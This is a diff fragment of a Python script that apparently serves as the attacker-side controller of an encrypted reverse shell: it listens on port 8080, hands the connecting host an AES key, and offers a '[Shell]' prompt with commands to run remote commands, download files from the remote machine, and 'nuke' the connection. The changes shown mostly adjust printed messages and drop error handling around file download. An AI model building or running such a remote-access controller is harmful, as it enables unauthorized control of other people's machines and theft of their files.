@@ -64,14 +64,14 @@ def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(('192.168.0.174', 8080))
     s.listen(1)
-    print('[+] Listening for incoming TCP connections on port 8080')
+    print('[+] Listening for incoming TCP connections on port 8080\n')
     conn, addr = s.accept()
     conn.send(SEND_AES(key.encode()))
     
     while True:
         command = input("[Shell]~ $ ")
         if 'nuke' in command:
-            print('\t[!] Nuking connection')
+            print('\n\t[!] Nuking connection\n')
             conn.send(encrypt(command.encode()))
             sleep(1.5)
             conn.close()
@@ -87,10 +87,9 @@ def connect():
             sleep(2.5)
         elif command[:8] == 'download':
             conn.send(encrypt(command.encode()))
-            try:
-                download(command[9:])
-            except:
-                print('[-] Failed to download file from remote host =(')
+            print(f'\n\t[!] Downloading file: {command[9:]}')
+            download(command[9:])
+            print(f'\t[!] {command[9:]} download complete\n')
         elif command == 'help':
             conn.send(encrypt(command.encode()))
             print('\n---HELP---\n')
@@ -103,4 +102,3 @@ def connect():
             print('\n'+decrypt(result).decode()+'\n')
             
 connect()
-
